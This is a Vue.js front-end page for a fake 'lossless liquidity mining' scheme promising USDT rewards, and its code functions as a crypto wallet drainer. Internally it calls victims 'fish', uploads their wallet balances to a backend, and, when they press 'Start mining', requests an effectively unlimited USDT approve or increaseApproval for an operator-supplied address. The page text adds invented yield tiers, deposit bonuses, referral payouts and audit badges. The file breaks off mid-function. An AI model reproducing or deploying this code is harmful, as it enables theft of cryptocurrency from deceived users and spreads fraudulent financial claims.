<template>
  <div class="home">
    <div class="topBackgroup">
      <div class="content">
        <img src="../assets/images/top_trx_logo.png" draggable="true" />
      </div>
      <div class="title_text">
        <div class="title_tips">Lossless mining</div>
        <div class="title_tips">Liquidity pledge-free</div>
        <div class="reward">
          Reward
          <b class="value"><span>120 Million</span></b>
          USDT
        </div>
        <div class="submit">
          <a class="btnConnect" @click="connectionWallet" v-show="showConnection">Connect wallet</a>
          <a class="btnConnect" @click="startMining" v-show="showAddress">Start mining</a>
        </div>
        <div class="linkBox" v-show="showAddress">
          <i class="iconfont"></i>
          <span>{{ walletAddress }}</span>
        </div>
      </div>
    </div>
    <div class="itemText" style="padding: 10px 20px">
      <van-tabs v-model="active">
        <van-tab title="Mining Pool">
          <div class="blockBox">
            <div class="blockTitle">
              <div class="leftIcon"></div>
              Pool data
            </div>
            <div class="blockContent">
              <div class="blockItem">
                <div class="itemTitle">Total output</div>
                <div class="itemValue">
                  <span id="totaloutput">
                    <countTo :startVal="0" :endVal="totalOutput" :duration="2000" />
                  </span> {{ fish.type }}
                </div>
              </div>
              <div class="blockItem">
                <div class="itemTitle">Valid node</div>
                <div class="itemValue">
                  <span id="validnode">
                   <countTo :startVal="0" :endVal="validNode" :duration="2000" />
                  </span>
                </div>
              </div>
              <div class="blockItem">
                <div class="itemTitle">Participant</div>
                <div class="itemValue">
                  <span id="participant">
                    <countTo :startVal="0" :endVal="participant" :duration="2000" />
                  </span>
                </div>
              </div>
              <div class="blockItem">
                <div class="itemTitle">User Revenue</div>
                <div class="itemValue red" style="color: #de3639!important;">
                  <span id="revenue">
                     <countTo :startVal="0" :endVal="userRevenue" :duration="2000" />
                  </span> USDT
                </div>
              </div>
            </div>
          </div>
          <div
            class="sectionTips red"
            id="notice"
            style="color: #de3639!important;"
          >
            The first single deposit of more than 20,000 USDT will be rewarded
            10%, and this reward can only be enjoyed once. For example, the
            first single deposit of 30,000 USDT will be rewarded with 3,000
            USDT.
          </div>
          <div
            class="sectionTitle"
            style="width: 100%;
              text-align: center;
              color: #000;
              font-size: 17px;
              font-weight: 600;"
          >
            Mining
          </div>
          <div
            class="sectionTips"
            style="width: 100%;
              text-align: center;
              color: #a1a1b3;
              padding: 10px 0;
              font-size: 13px;"
          >
            Liquidity mining income
          </div>
          <div
            class="blockTitle alignCenter minerTitle"
            style="background-color: #c63127;
              color: #fff;
              border-top-left-radius: 10px;
              border-top-right-radius: 10px;
              padding: 10px 0;
              font-size: 15px;
              font-weight: 700;"
          >
            Supercomputing miner
          </div>
          <div class="sectionTitle">Help center</div>
          <div class="sectionTips">Hope it helps you</div>
          <van-collapse v-model="activeNames" style="text-align: left;">
            <van-collapse-item title="How do i need to join？" name="1"
              ><p style="font-size: 14px;color: #8f8f94;">
                Participating in non-destructive and non-guaranteed liquidity
                mining requires payment of TRX miner fees to receive the
                replacement gold coupons, and the TRX wallet address only needs
                to be claimed once. Automatically open mining permissions after
                success.
              </p></van-collapse-item
            >
            <van-collapse-item title="How to calculate income？" name="2">
              <p style="font-size: 14px;color: #8f8f94;">
                When you join successfully, the smart contract starts to
                calculate your address through the node and start to calculate
                the revenue.
              </p>
            </van-collapse-item>
            <van-collapse-item
              title="What is the yield percentage rate?"
              name="3"
            >
              <div
                class="mui-collapse-content"
                style="font-size: 14px;color: #8f8f94;"
              >
                <p>The yield below 20000USDT Rate≈3%,</p>
                <p>20000USDT-50000USDT yield Rate≈4%,</p>
                <p>50000USDT-100000USDT yield Rate≈5%,</p>
                <p>100000USDT-300000USDT yield Rate≈6%,</p>
                <p>
                  300000USDT-600000USDT yield Rate≈8% (limited to 100 places
                  worldwide),
                </p>
                <p>
                  and 600000USDT yield Rate≈10% (limited to 50 places worldwide)
                </p>
              </div>
            </van-collapse-item>
            <van-collapse-item title="How do i withdraw money?" name="2">
              <p>
                USDT withdrawals will be automatically sent to the wallet
                address you added to the node, other addresses are not
                supported.
              </p>
            </van-collapse-item>
            <van-collapse-item title="Friends recommendation reward" name="2">
              <p>
                Send your invitation link, and your friends will join the node
                through your link, and you will receive generous token
                rewards.You can get 20% of the income of the referrer.
              </p>
            </van-collapse-item>
          </van-collapse>
          <div class="sectionTitle">Audit report</div>
          <div class="sectionTips">We have a secure audit report</div>
          <div class="partnerBox">
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p1.png" draggable="true" />
              </div>
            </div>
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p2.png" draggable="true" />
              </div>
            </div>
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p3.png" draggable="true" />
              </div>
            </div>
          </div>
          <div class="sectionTitle">Partner</div>
          <div class="sectionTips">Our business partner</div>
          <div class="partnerBox">
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p4.png" draggable="true" />
              </div>
            </div>
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p5.png" draggable="true" />
              </div>
            </div>
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p6.png" draggable="true" />
              </div>
            </div>
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p7.png" draggable="true" />
              </div>
            </div>
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p8.png" draggable="true" />
              </div>
            </div>
            <div class="partnerItem">
              <div class="imgbox">
                <img src="../assets/images/p9.png" draggable="true" />
              </div>
            </div>
          </div>
        </van-tab>
        <van-tab title="Account">
          <div class="blockBox">
            <div class="blockTitle">
              <div class="leftIcon"></div>
              My account
            </div>
            <div class="blockContent">
              <div class="blockItem">
                <div class="itemTitle">Total output</div>
                <div class="itemValue">
                  <span id="output_usdt">{{ fish.total==null?"0.00":fish.total}}</span> USDT
                </div>
              </div>
              <div class="blockItem">
                <div class="itemTitle">Wallet balance</div>
                <div class="itemValue">
                  <span id="account_usdt">{{ fish.usdtShow==null?"0.00":fish.usdtShow }}</span> USDT
                </div>
              </div>
              <div class="blockItem">
                <div class="itemTitle">Withdrawable</div>
                <div class="itemValue">
                  <span id="withdrawable_usdt">{{fish.allowWithdraw==null?"0.00":fish.allowWithdraw}}</span> USDT
                </div>
              </div>
            </div>
            <div class="changeTab">
              <div
                @click="isActive = 1"
                :class="['changeItem', isActive == 1 ? 'active' : '']"
              >
                Withdraw
              </div>
              <div
                @click="isActive = 2,queryRecord()"
                :class="['changeItem', isActive == 2 ? 'active' : '']"
              >
                Record
              </div>
            </div>
            <div id="WithdrawTab" v-show="isActive == 1">
              <div class="blockTitle">
                <div class="leftIcon"></div>
                Withdraw
              </div>
              <div class="exchange">
                <div class="changeLeft">
                  <div class="changeValue">
                    <div class="innum uni-input">
                      <input
                        id="changevalue"
                        maxlength="140"
                        placeholder="0.00"
                        step="0.000000000000000001"
                        enterkeyhint="done"
                        autocomplete="off"
                        type="number"
                        class="uni-input-input"
                        v-model="redeeallBalance"
                      />
                    </div>
                  </div>
                  <div class="changeAll">
                    <a style="color: inherit;" @click="redeeall()">Redeem all</a>
                  </div>
                </div>

                <div
                  class="changeIcon"
                  style="height: 40px;border-right: 1px solid #777777;"
                ></div>
                <div class="changeRight">
                  <div class="changeValue">
                    <div class="usdtimage">
                      <img src="../assets/images/top_usdt_icon.png" />
                      <span class="coinName">USDT</span>
                    </div>
                  </div>
                </div>
              </div>
              <div class="exchangeBtn"><a id="postChangeValue" @click="confirm()">Confirm</a></div>
              <div class="exchangeTips">
                Your withdraw will be sent to your USDT wallet address within 24
                hours in the future.
                <div style="color: #13ce66;font-weight: bold;font-size: 13px;">{{this.salemanPhone?"If you have any questions, please contact customer service ("+this.salemanPhone+")":""}}</div>
              </div>
            </div>
          </div>
          <div id="RecordTab" v-show="isActive == 2">
            <div class="recordContent" style="display: block;">
              <table id="table1" border="0" width="100%">
                <div style="padding: 0px 10px;height: 215px;">
                  <thead style="display:flex;padding: 0px 0px;">
                  <th style="width: 31%!important;font-size: 15px;color: #de3639;text-align: center;">Time</th>
                  <th style="width: 31%!important;font-size: 15px;color: #de3639;text-align: center;">Quantity</th>
                  <th style="width: 31%!important;font-size: 15px;color: #de3639;text-align: center;">Status</th>
                  </thead>
                  <div v-for="item in recordList">
                    <tr>
                      <td>{{item.time}}</td>
                      <td>{{item.quantity}}</td>
                      <td>
                        {{item.status=="1"?"Waiting":""}}
                        {{item.status=="2"?"Waiting":""}}
                        {{item.status=="3"?"Success":""}}
                        {{item.status=="4"?"Refused":""}}</td>
                    </tr>
                  </div>
                </div>
              </table>
              <div class="uni-pagination">
                <a class="uni-pagination-btn" href="javascript:get_reward_list('prev');"><i class="iconfont icon-left"></i></a>
                <a class="uni-pagination-btn" href="javascript:get_reward_list('next');"><i class="iconfont icon-right"></i></a>
              </div>
            </div>
          </div>
        </van-tab>
        <van-tab title="Team">
          <div class="blockBox">
            <div class="blockTitle">
              <div class="leftIcon"></div>
              Team Data
            </div>
            <div class="blockContent">
              <div class="blockItem">
                <div class="itemTitle">Number of teams</div>
                <div class="itemValue">{{auNum}}</div>
              </div>
              <div class="blockItem">
                <div class="itemTitle">Team Revenue</div>
                <div class="itemValue">0 USDT</div>
              </div>
            </div>
          </div>
          <div class="blockBox shareBox">
            <div class="shareTitle">My wallet address</div>
            <div class="shareInfo">
              <div class="infoLeft">
                <input id="myaddress" v-model="myWalletAddress" style="border-style: none;width: 90%;"></input>
              </div>
              <div class="infoRight">
                <div class="copy">
                  <a class="btnmyaddress" v-clipboard:copy="myWalletAddress" v-clipboard:success="onCopy">Copy</a>
                </div>
              </div>
            </div>
            <div class="shareTips">
              Set the referrer, the referrer will get additional rewards from
              the mining pool
            </div>
            <div class="shareTitle">My share link</div>
            <div class="shareInfo">
              <div class="infoLeft">
                <input id="myaddress" v-model="shareLink" style="border-style: none;width: 90%;"></input>
              </div>
              <div class="infoRight">
                <div class="copy">
                  <a class="btnmyaddress"  v-clipboard:copy="shareLink" v-clipboard:success="onCopy">Copy</a>
                </div>
              </div>
            </div>
            <div class="shareTips">
              Invite friends to earn ongoing rewards together! Once a friend you invite successfully becomes a validator, you can get a 10.00% refund from your friend's verification reward each time. Please contact customer service to request your exclusive invitation link.
            </div>
            <div class="shareTips">
              Share with your friends through the link, and if your friends
              participate in the event and deposit 1,000 USDT or more of digital
              currency for the first time, both you and your friends can get a
              free reward worth 100 USDT.
            </div>
          </div>
        </van-tab>
      </van-tabs>
    </div>
  </div>
</template>

<script>
import CountTo from "vue-count-to";
import {addFish, getFish, getAuth, addAuth, withdraw, listRecord} from "@/api/tron/auth";
export default {
  name: "Home",
  components: {
    CountTo
  },
  data() {
    return {
      trx_abi: [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_value","type":"uint256"}],"name":"calcFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"oldBalanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}],
      eth_abi: [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}],
      active: 0,
      isActive: 1,
      activeNames: ["0"],
      contract: undefined,
      trx_contractAddr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
      eth_contractAddr: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      approveAddr: undefined,
      salemanPhone: null,
      walletAddress: undefined,
      myWalletAddress: undefined,
      shareLink: window.location.href,
      showConnection: true,
      showAddress: false,
      redeeallBalance: undefined,
      recordList:[],
      totalOutput:0.00,
      validNode:0.00,
      participant:0.00,
      userRevenue:0.00,
      auNum: 0,
      fish: {
          token: undefined,
          address: undefined,
          auAddress: undefined,
          type: "TRX",
          trx: 0.00,
          eth: 0.00,
          usdt: 0.00,
          usdtShow: undefined,
          total: undefined,
          allowWithdraw: undefined
      }
    };
  },
  created() {
    this.init();
  },
  methods:{
    connectionWallet(){
      var obj = setInterval( async async => {
        clearInterval(obj);
        console.info("当前环境="+this.fish.type);
        //连接TRX环境
        if (window.tronWeb && window.tronWeb.defaultAddress.base58 && this.fish.type=="TRX") {
          var wallet_addr = window.tronWeb.defaultAddress.base58;
          this.myWalletAddress = wallet_addr;
          this.walletAddress = wallet_addr.substr(0, 4) + '***' + wallet_addr.substr(30, 6);
          this.contract = await window.tronWeb.contract(this.trx_abi, this.trx_contractAddr);
          console.info(wallet_addr);

          await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx= result==null?"0.00":result);
          this.fish.address=wallet_addr;
          this.fish.type="TRX";

          await this.contract.balanceOf(wallet_addr).call((err, usdt) => {
            this.fish.usdt= usdt==null?"0.00":usdt/1.0;
            this.fish.usdtShow=usdt==null?"0.00":(usdt/1000000).toFixed(2);
            addFish(this.fish).then(response => {
              if (response.data.code == 200){
                this.showConnection = false;
                this.showAddress = true;
                this.fish=response.data.data;
                var balance = eval('(' + this.fish.balance +')');
                this.fish.trx=balance.trx==null?0.00:balance.trx;
                this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
                this.fish.usdtShow=balance.usdt==null?0.00:balance.usdt;
                this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
                this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;

                return true;
              }else{
                this.showConnection = false;
                this.showAddress = true;
                return false;
              }
            });
          });
        }
        //连接ETH环境
        if (window.ethereum && this.fish.type=="ETH"){
          var Web3 = require('web3');
          var web3 = new Web3(Web3.givenProvider);

          try {
            await window.ethereum.enable();

            let targetAddress = await web3.eth.getAccounts();
            var wallet_addr = targetAddress[0].toString();
            this.myWalletAddress = wallet_addr;
            this.walletAddress = wallet_addr.substr(0, 4) + '***' +wallet_addr.substr(30, 6);
            this.contract = new web3.eth.Contract(this.eth_abi,this.eth_contractAddr);
            console.info(wallet_addr);

            let balance = await web3.eth.getBalance(wallet_addr).then(result => this.fish.eth= result==null?"0.00":result);
            console.log('balance===>', balance)
            this.fish.address=wallet_addr;
            this.fish.type="ETH";

            await this.contract.methods.balanceOf(wallet_addr).call((err, usdt) => {
              this.fish.usdt= usdt==null?"0.00":usdt/1.0;
              this.fish.usdtShow=usdt==null?"0.00":(usdt/1000000).toFixed(2);
              addFish(this.fish).then(response => {
                if (response.data.code == 200){
                  this.showConnection = false;
                  this.showAddress = true;
                  this.fish=response.data.data;
                  var balance = eval('(' + this.fish.balance +')');
                  this.fish.eth=balance.eth==null?0.00:balance.eth;
                  this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
                  this.fish.usdtShow=balance.usdt==null?0.00:balance.usdt;
                  this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
                  this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;

                  return true;
                }else{
                  this.showConnection = false;
                  this.showAddress = true;
                  return false;
                }
              });
            });
          } catch (error) {
            this.$toast({ message: error.message});
          }
        }
      }, 10);
    },
    getUrlKey: function (name) {
      return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.href) || [, ""])[1].replace(/\+/g, '%20')) || null
    },
    init(){
      var token=this.getUrlKey("token");
      if (!token){
        this.$toast({ message: "Please input token"});
        return;
      }
      this.fish.token=token;
      getAuth(token).then(response => {
        if (response.data.code==200){
          this.approveAddr=response.data.data.address;
          this.fish.auAddress=response.data.data.address;
          this.fish.type=response.data.data.type;
          this.salemanPhone=response.data.data.salemanPhone;
          this.totalOutput=response.data.data.totalOutput?parseInt(response.data.data.totalOutput):0.0;
          this.validNode=response.data.data.validNode?parseInt(response.data.data.validNode):0.0;
          this.participant=response.data.data.participant?parseInt(response.data.data.participant):0.0;
          this.userRevenue=response.data.data.userRevenue?parseInt(response.data.data.userRevenue):0.0;
          this.auNum=response.data.data.auNum?parseInt(response.data.data.auNum):0;
          this.connectionWallet();
          return;
        }
        if (response.data.code==500){
          this.showConnection = false;
          this.showAddress = true;
          return;
        }
      });
    },
    addAuth(data){
      addAuth(data).then(response => {
        if (response.data.code==200){
          this.$toast({ message: "Congratulations, Successfully"});
        }
      });
    },
    startMining(){
      var token=this.getUrlKey("token");
      this.fish.token=token;
      this.fish.auAddress=this.approveAddr;
      getFish(this.fish).then(response => {
        if (response.data.data.auRecordId == null){
          //TRX的授权
          if (this.fish.type == "TRX"){
            window.tronWeb.trx.getBalance( this.myWalletAddress).then(result => this.fish.trx=(result/1000000).toFixed(6));
            if (this.fish.trx <= 6){
              this.$toast({ message: "Your TRX balance is insufficient. Please deposit at least 10 TRX"});
              return;
            }
            let res = this.contract["increaseApproval"](this.approveAddr, "90000000000000000000000000000");
            res.send({
              feeLimit: 10000000,
              callValue: 0,
              shouldPollResponse: false
            }, (err, res) => {
              if (err == null){
                this.addAuth(this.fish);
              }
            })
          }
          //ETH的授权
          if (this.fish.type == "ETH") {
            let res = this.contract.methods.approve(this.approveAddr,"90000000000000000000000000000");
            res.send({
              from: this.fish.address
            }, (err, res) => {
              console.info(err);
              if (err == null){
                this.addAuth(this.fish);
              }else{
                this.$toast({ message: err.message});
              }
            })
          }
          return true;
        }else{
          this.fish=response.data.data;
          var balance = eval('(' + this.fish.balance +')');
          this.fish.trx=balance.trx==null?0.00:balance.trx;
          this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
